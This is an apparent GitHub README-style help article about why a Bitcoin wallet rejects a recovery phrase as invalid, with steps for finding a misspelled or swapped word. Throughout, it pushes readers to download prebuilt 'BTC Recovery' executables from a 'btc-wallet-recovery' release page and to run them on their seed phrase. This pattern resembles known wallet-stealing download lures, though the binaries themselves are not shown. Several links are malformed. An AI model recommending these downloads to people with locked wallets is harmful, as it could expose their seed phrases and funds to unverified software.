<div align="center">
<img src="assets/banner-article.png" alt="Invalid recovery phrase: checksum and misspelled words">
</div>

# Invalid recovery phrase: checksum and misspelled words

<p align="center">Download BTC Recovery for your platform, then run the search for this case on your own machine.</p>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` that carries both the x86-64 and the ARM64 build.

> Only download from this GitHub release page.

An "invalid recovery phrase" message means the wallet checked the words and the sequence and found they do not fit together  -  almost always one word mistyped, one word outside the list, or one position out of place. BTCRecover finds the offending word locally by testing substitutions against the phrase's own checksum and then against an address from the wallet.

## You'll see this if

The wallet refuses the phrase before it derives anything. That refusal is useful information: it means the phrase is not merely the wrong wallet, it is not a valid phrase in that format at all.

| What you see | What it points to | Where to go |
|---|---|---|
| "Invalid recovery phrase", "invalid mnemonic" or a checksum error | a word, or its position, is wrong | here |
| The wallet rejects one word as not in the list | a typo, or a word from a different list | here |
| The phrase is accepted but opens nothing | not this problem  -  the phrase is valid | [Restored seed shows an empty wallet: derivation paths](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-empty-wallet-derivation-path.md) |
| A 13- or 16-word phrase is rejected by a 12/24-word field | a legacy format, not a broken phrase | [You forgot which wallet software you used](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/forgot-which-wallet-software-btcrecover.md) |
| The same phrase worked years ago in another app | that app used a different word list | here, then the wallet-type page |

## Why it happens

A standard phrase ends in a checksum. The final word is not free choice: it encodes a value computed from all the words before it, so the wallet can reject a mistyped phrase instantly, without deriving a single key. One wrong letter, one word from a neighbouring language list, one swapped pair  -  each breaks that value.

The word list is the second gate. A standard list holds 2,048 words, and a word that is not on it fails immediately, which is why typos are caught rather than silently producing an empty wallet. Real words that are simply the wrong real word are the harder case: they pass the list check and fail the checksum, and they look completely normal on the paper.

Legacy formats explain most of the confusing cases. Early Electrum seeds used their own word list, and Blockchain.com's legacy scheme used sixteen words of its own, so a phrase can be perfectly correct and still be rejected by a wallet that expects the standard list. A rejection is therefore a statement about the format as much as about the words.

## Fix

Treat the phrase as a short list of suspects, not a broken object: find the word that fails, replace it, and confirm the result against an address.

1. **Count the words and check the expected length.** 12, 18 or 24 for a standard phrase; 13 for early Electrum; 16 for the legacy Blockchain.com scheme. A length mismatch is a format problem, not a typo.
2. **Check every word against the list, one at a time.** Any word that is not on it is the culprit, and its near neighbours  -  one letter different, a plural, a similar spelling  -  are the candidates.
3. **Look for transposed words.** If every word is on the list, the checksum failure is usually a swapped pair rather than a bad word: [Seed words in the wrong order](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/fix-seed-words-in-wrong-order-with-btcrecover.md).
4. **Find an address from the wallet** so a repaired phrase can be confirmed rather than assumed: [How to find a lost Bitcoin wallet address](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/find-lost-bitcoin-wallet-address-btcrecover.md).
5. **Download the current release from the GitHub releases page** and run a seed search with the suspect positions marked, letting the checksum eliminate wrong guesses: [the current release](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1).
6. **Test candidates in the wallet itself, then in a clean install.** A phrase that loads and shows your address is repaired; one that loads and shows nothing is valid but different.
7. **Record the corrected phrase on paper** and verify it with a restore, because the paper copy is wrong in exactly the place you just fixed.

## If that did not work

If every word is on the list, the positions look right and the phrase is still rejected, the format is the remaining explanation.

Check the wallet's stated expectations before changing anything else: a phrase for a wallet that used its own word list will never satisfy a standard checksum, no matter how many words you substitute. This is common with seeds from very old software and with phrases copied from a wallet that no longer exists in the same form. Where the phrase came from an app you cannot identify, identification is the productive step rather than more guessing: [How to recover a Bitcoin wallet with a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/recover-bitcoin-wallet-with-seed-phrase-btcrecover.md) covers what the wallet type changes, and [Recover a seed phrase with 1-3 missing words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-missing-seed-words.md) covers the case where a whole word is genuinely absent rather than wrong.

One more pattern is worth ruling out early: a phrase that is correct but was written down with an extra word, or with the same word twice. Dropping the duplicate is a one-minute test and explains a surprising share of checksum failures. [A run that finds nothing]([A recovery run that finds nothing: what to check](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-recovery-failed-what-now.md)) is the checklist once the obvious cases are exhausted.

## Prevention

- Write the phrase from the wallet's own display, never from memory or dictation.
- Read every word back against the wallet list as you write it, especially near-homophones.
- Verify by restoring into an empty wallet before the wallet holds funds: [How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md).
- Keep the wallet name and year with the backup, so a future format mismatch is identifiable.
- BTCRecover is actively maintained, and the current release is published on the GitHub releases page.

## FAQ

### Why does my recovery phrase say invalid?

Because the checksum in the final word does not match the rest of the sequence. That is a statement about the words and their order, not about the wallet or your balance: one word is wrong, out of the list, or in the wrong place.

### One of my 24 words may be misspelled. How do I find it?

Test each word against the list and try near neighbours in the suspect position, letting the checksum reject wrong guesses. A single misspelled word in a known position is one of the fastest searches there is, because the phrase itself does the filtering.

### Can a correctly written phrase be rejected?

Yes, if the wallet expects a different word list or a different length  -  early Electrum and legacy Blockchain.com seeds are the usual examples. The phrase can be perfect and still fail a check designed for a different format.

### Does an invalid phrase mean the wallet is empty?

No. A rejection happens before derivation, so it says nothing about the balance. A phrase that is accepted and then shows nothing is the case that concerns your balance, and it has a different cause.

### What is a checksum in a seed phrase?

A short value computed from all the words and encoded in the last one. It lets a wallet detect a mistyped or reordered phrase immediately, without deriving keys, which is why the error appears instantly rather than after a long wait.

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [Seed words in the wrong order]([Seed words in the wrong order](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/fix-seed-words-in-wrong-order-with-btcrecover.md))
- [Recover a seed phrase with 1-3 missing words]([Recover a seed phrase with 1-3 missing words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-missing-seed-words.md))
- [You forgot which wallet software you used]([You forgot which wallet software you used](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/forgot-which-wallet-software-btcrecover.md))
- [Restored seed shows an empty wallet]([Restored seed shows an empty wallet: derivation paths](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-empty-wallet-derivation-path.md))
